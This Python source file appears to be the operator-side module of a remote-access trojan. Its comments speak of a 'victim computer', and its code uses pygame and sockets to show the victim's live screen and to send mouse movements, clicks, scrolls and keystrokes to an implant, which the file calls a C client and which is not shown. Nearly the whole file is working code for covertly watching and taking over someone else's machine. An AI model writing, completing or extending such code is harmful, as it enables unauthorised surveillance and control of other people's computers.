"""
This file contains all the code for pygame-based functionality
This includes the video stream, keyboard control, and mouse control
"""

import threading
import pygame
from time import sleep
# import my stuff
import utils
from consts import *

# global buffer, lock, and dirty bit used for transferring image data
imageBuffer = []
imageLock = threading.Lock()
imageDirty = False
# global dict used for transferring image metadata
imageMeta = {BASE_WIDTH:0, BASE_HEIGHT:0}
# globals to keep track of pygame thread and whether it should continue running
pygameThreadHandle = None
videoThreadHandle = None
threadRun = False
# globals for tracking if mouse & keyboard control is enabled
mouseControl = False
keyboardControl = False
# global input socket used for sending inputs from pgame
inputSock = None

"""
	Enable/disable video stream from victim computer
	Expects two arguments
		state - True/False for whether video stream should run
		mainSock - main communication socket used for commands
	TODO - combine mouse/keyboard control into video socket or new socket
"""
def toggleVideo(state, mainSock):
	global pygameThreadHandle
	global videoThreadHandle
	global threadRun

	# if starting threads when they haven't been started
	if state and not threadRun:
		# check if any threads are running when they shouldn't be
		fail = False
		if pygameThreadHandle and pygameThreadHandle.is_alive():
			print("Pygame thread not killed!")
			fail = True
		if videoThreadHandle and videoThreadHandle.is_alive():
			print("Video thread not killed!")
			fail = True
		if fail:
			return
		# start the video and pygame threads
		threadRun = True
		videoThreadHandle = videoRecvThread(mainSock)
		pygameThreadHandle = pygameThread(mainSock)
		videoThreadHandle.start()
		pygameThreadHandle.start()
	elif not state:
		threadRun = False

"""
	Enable/disable control of victim's keyboard
	Expects True/False argument for whether to control keyboard
"""
def toggleKeyboard(state, mainSock):
	global keyboardControl
	global mouseControl
	global inputSock
	keyboardControl = state
	if state: # make sure video stream is on if controlling keyboard
		toggleVideo(state, mainSock)
		mainSock.sendall(bytes([START_KEYS]) + b'\0')
		if not inputSock:
			inputSock = utils.openConnection(INPUT_PORT)
	elif not mouseControl:
		inputSock.close()

"""
	Enable/disable control of victim's mouse
	Expects True/False argument for whether to control mouse
"""
def toggleMouse(state, mainSock):
	global mouseControl
	global keyboardControl
	global inputSock
	mouseControl = state
	if state: # make sure video stream is on if controlling mouse
		toggleVideo(state, mainSock)
		mainSock.sendall(bytes([START_MOUSE]) + b'\0')
		if not inputSock:
			inputSock = utils.openConnection(INPUT_PORT)
	elif not keyboardControl:
		inputSock.close()

"""
	Create a class to handle all the pygame-based functionality
	This thread reads data provided by the videoRecvThread
	Two threads are used for this module to decouple pygame's frame rate from the socket receive rate
	(Yes, this could be done by making the socket non-blocking, but I'm more familiar with this approach)
	This class will run as a separate thread
	TODO - refactor this to be a line like the following:
		pygameThread = Thread(pygameFunc, [mainSock])
"""
class pygameThread (threading.Thread):
	def __init__(self, mainSock):
		threading.Thread.__init__(self, daemon=True)
		self.mainSock = mainSock

	def run(self):
		# get globals
		global threadRun
		# call the function
		pygameHandler(self.mainSock)
		# send the signal for the other thread to end
		threadRun = False

"""
	Create a class to recieve video data
	This thread sends data for each frame to the pygameThread through a global buffer
	Two threads are used for this module to decouple pygame's frame rate from the socket receive rate
	(Yes, this could be done by making the socket non-blocking, but I'm more familiar with this approach)
	This class will run as a separate thread
"""
class videoRecvThread (threading.Thread):
	def __init__(self, mainSock):
		threading.Thread.__init__(self, daemon=True)
		self.mainSock = mainSock
		self.videoSock = None

	def run(self):
		# get globals
		global mouseControl
		global keyboardControl
		global threadRun
		global inputSock
		# send signal to start video and create socket
		self.mainSock.sendall(bytes([START_VIDEO]) + b'\0')
		self.videoSock = utils.openConnection(VIDEO_PORT)
		# call pygame handler to display video
		videoHandler(self.videoSock)
		# send the signal for the other thread to end
		threadRun = False
		# send end signals to end mouse, keyboard, and video
		if mouseControl:
			self.mainSock.sendall(bytes([END_MOUSE]) + b'\0')
			mouseControl = False
		if keyboardControl:
			self.mainSock.sendall(bytes([END_KEYS]) + b'\0')
			keyboardControl = False
		self.mainSock.sendall(bytes([END_VIDEO]) + b'\0')
		# close the video socket and input socket
		inputSock.close()
		inputSock = None
		self.videoSock.close()

"""
	Handle all the pygame-based functionality
	TODO - clean up this function
"""
def pygameHandler(mainSock):
	# globals we'll be using
	global imageLock
	global imageDirty
	global imageBuffer
	global imageMeta
	global threadRun
	global mouseControl
	global keyboardControl
	global inputSock

	# initialize the pygame module
	pygame.init()
	# prevent mouse motion events from appearing on the event queue
	pygame.event.set_blocked(pygame.MOUSEMOTION)
	# load and set the logo
	pygame.display.set_caption("minimal program")

	# create a clock to use for limiting the frame rate
	clock = pygame.time.Clock()
	# create a surface on screen that has the size of 240 x 180
	screen = pygame.display.set_mode((768,432), pygame.RESIZABLE)
	
	# vars used for drawing image (some are local copies of globals)
	dirty = False
	buff = b''
	meta = {}
	surf = None
	surfRect = None # used to get the mouse position easier
	# constants for panning and zooming
	STEP_FACTOR = 20
	ZOOM_FACTOR = 0.1
	# values for offset and zoom
	zoom = 1.0
	offsetX = 0
	offsetY = 0

	# main loop
	while threadRun:
		# copy new image data if the global buffer was updated
		if imageDirty and imageLock.acquire():
			buff = imageBuffer[:]
			meta = imageMeta.copy()
			imageDirty = False
			imageLock.release()
			dirty = True
		# create the new surface if we got a new frame
		if dirty:
			surf = pygame.image.frombuffer(buff, (meta[BASE_WIDTH], meta[BASE_HEIGHT]), "RGBA")
			# rescale the surface as needed
			# do some math so the scaling keeps the same aspect ratio
			windowSize = pygame.display.get_window_size()
			scaledWidth = windowSize[0]
			scaledHeight = scaledWidth * meta[BASE_HEIGHT] / meta[BASE_WIDTH] # keep image ratio - scaled width * image height / image width
			if scaledHeight > windowSize[1]: # too tall for window
				scaledWidth = scaledWidth * windowSize[1] / scaledHeight # reduce width to keep the ration
				scaledHeight = windowSize[1]
			scaledWidth = scaledWidth * zoom
			scaledHeight = scaledHeight * zoom
			surf = pygame.transform.smoothscale(surf, (int(scaledWidth), int(scaledHeight))) # scale the image to fit the window
		
		# check if dirty bit is set to draw the next frame
		if surf and dirty:
			screen.fill((0, 0, 0))
			windowSize = pygame.display.get_window_size()
			centerX = (windowSize[0] - surf.get_width()) // 2
			centerX = int(centerX + (offsetX * zoom))
			centerY = (windowSize[1] - surf.get_height()) // 2
			centerY = int(centerY + (offsetY * zoom))
			surfRect = surf.get_rect(topleft=(centerX, centerY))
			screen.blit(surf, (centerX, centerY))
			pygame.display.flip()
			dirty = False
		elif dirty: # dirty bit was set but the image to draw is None
			print("surf is NONE!")

		# create a list for all the inputs to send
		inputList = bytes([START_INPUT])
		# always send the mouse position if we're controlling the mouse
		if mouseControl and surfRect:
			mouseX, mouseY = pygame.mouse.get_pos()
			# get the x pos
			mouseX = (mouseX - surfRect.x) / surfRect.width * meta[BASE_WIDTH]
			if mouseX < 0:
				mouseX = 0
			elif mouseX > meta[BASE_WIDTH]:
				mouseX = meta[BASE_WIDTH]
			# convert pixel pos to absolute pos?
			# idk, just loko here: https://stackoverflow.com/questions/7492529/how-to-simulate-a-mouse-movement
			mouseX = mouseX * 0xFFFF / meta[BASE_WIDTH] + 1
			# get the y pos
			mouseY = (mouseY - surfRect.y) / surfRect.height * meta[BASE_HEIGHT]
			if mouseY < 0:
				mouseY = 0
			elif mouseY > meta[BASE_HEIGHT]:
				mouseY = meta[BASE_HEIGHT]
			mouseY = mouseY * 0xFFFF / meta[BASE_HEIGHT] + 1
			# put the mouse move into the input stream
			inputList += bytes([MOUSE_POS]) + int(mouseX).to_bytes(4, 'big') + int(mouseY).to_bytes(4, 'big') + bytes([CONT_INPUT])
		# go through the event queue
		for event in pygame.event.get():
			if event.type == pygame.QUIT: # was the windows closed?
				return
			elif event.type == pygame.KEYDOWN: # key was pressed down
				if event.mod & pygame.KMOD_RCTRL: # right control is pressed down
					dirty = True # assume that the image is mooved or resized
					if event.key == pygame.K_UP: # move up - push image down - increase offsetY
						offsetY = offsetY + (STEP_FACTOR * zoom)
					elif event.key == pygame.K_DOWN:
						offsetY = offsetY - (STEP_FACTOR * zoom)
					elif event.key == pygame.K_LEFT: # move left - push image right - increase offsetX
						offsetX = offsetX + (STEP_FACTOR * zoom)
					elif event.key == pygame.K_RIGHT:
						offsetX = offsetX - (STEP_FACTOR * zoom)
					elif event.key == pygame.K_KP_PLUS or event.key == pygame.K_PLUS: # zoom in
						zoom = zoom + ZOOM_FACTOR # zoom is done linearly - 100%, 110%, 120%, 130%, etc
					elif event.key == pygame.K_KP_MINUS or event.key == pygame.K_MINUS:
						zoom = zoom - ZOOM_FACTOR
					elif event.key == pygame.K_c or event.key == pygame.K_r: # center the image and possibly reset the zoom
						offsetX = 0
						offsetY = 0
						if event.key == pygame.K_r: # reset the zoom
							zoom = 1.0
					else: # image wasn't moved or resized - set dirty bit back to false
						dirty = False
				elif keyboardControl: # right control was not pressed down and we're sending keyboard inputs
					if event.key in KEY_DICT: # if the key mapped to the Windows virtual-key code
						code = KEY_DICT[event.key]
						inputList += bytes([KEY_DOWN, code, CONT_INPUT])
					else: # TODO - debugging purposes only
						print("Key does not map to Windows virtual-key code!")
			elif event.type == pygame.KEYUP and keyboardControl and not event.mod & pygame.KMOD_RCTRL: # key released, keyboard controlled, right control not pressed
				if event.key in KEY_DICT: # if the key mapped to the Windows virtual-key code
					code = KEY_DICT[event.key]
					inputList += bytes([KEY_UP, code, CONT_INPUT])
				else: # TODO - debugging purposes only
					print("Key does not map to Windows virtual-key code!")
			elif mouseControl: # are we controlling the mouse?
				if event.type == pygame.MOUSEWHEEL: # if the mousewheel was scrolled
					scroll = event.y
					if scroll < 0:
						inputList += bytes([MOUSE_WHEEL, 0x00, abs(scroll), CONT_INPUT])
					else:
						inputList += bytes([MOUSE_WHEEL, scroll, CONT_INPUT])
				elif event.type == pygame.MOUSEBUTTONDOWN and event.button <= 3: # were the left, right, or middle mouse buttons pressed?
					code = MOUSE_DICT[event.button]
					inputList += bytes([MOUSE_DOWN, code, CONT_INPUT])
				elif event.type == pygame.MOUSEBUTTONUP and event.button <= 3: # were the left, right, or middle mouse buttons released?
					code = MOUSE_DICT[event.button]
					inputList += bytes([MOUSE_UP, code, CONT_INPUT])
		# are there any inputs to send to the C client?
		if len(inputList) > 1:
			# replace the last CONT_INPUT byte with a null-terminator and send the input string
			try:
				inputSock.sendall(inputList[:-1] + b'\0')
			except Exception as inst:
				print(type(inst))
				print(inst.args)
				print(inst)
				keyboardControl = False
				mouseControl = False
				try:
					inputSock.close()
				except Exception as inst:
					print(type(inst))
					print(inst.args)
					print(inst)
				inputSock = None
		# limit framerate to 30 FPS
		clock.tick(30)

	# we've broken out of the loop
	pygame.quit()

"""
	Handle video data recevied from socket
"""
def videoHandler(videoSock):
	# globals we'll be using
	global imageLock
	global imageBuffer
	global imageDirty
	global imageMeta
	global threadRun

	# buffer to hold data and way to track file size
	fileSize = 0
	width = 0
	height = 0
	# TODO - maybe make this a single buffer?
	data = b''
	buff = b''

	# main loop
	while threadRun:
		# get next frame
		try:
			# get frame information (width, height, size)
			# do this only when we need the next frame's info
			if fileSize == 0:
				# TODO - if recv pulls max data, check that header is not already in buffer
				data = videoSock.recv(12)
				width = int.from_bytes(data[0:4], byteorder='big', signed=True)
				height = int.from_bytes(data[4:8], byteorder='big', signed=True)
				fileSize = int.from_bytes(data[8:12], byteorder='big', signed=True)
			# get remaining frame data (RGB bytes)
			# TODO - receive set amount of data rather than remaining frame?
			data = videoSock.recv(fileSize-len(buff))
			# if we got data, append it to the current buffer
			if len(data) > 0:
				buff = buff + data
			# if the buffer is full, copy it to the global image buffer and shift the local buffer
			if len(buff) >= fileSize and imageLock.acquire():
				imageMeta[BASE_WIDTH] = width
				imageMeta[BASE_HEIGHT] = height
				imageBuffer = buff[:fileSize]
				imageDirty = True
				imageLock.release()
				buff = buff[fileSize:]
				fileSize = 0
		except Exception as inst:
			print(type(inst))
			print(inst.args)
			print(inst)
			sleep(10)
		if not data:
			# TODO - connection closed
			print("Video connection closed! TODO - Exit program...")
			return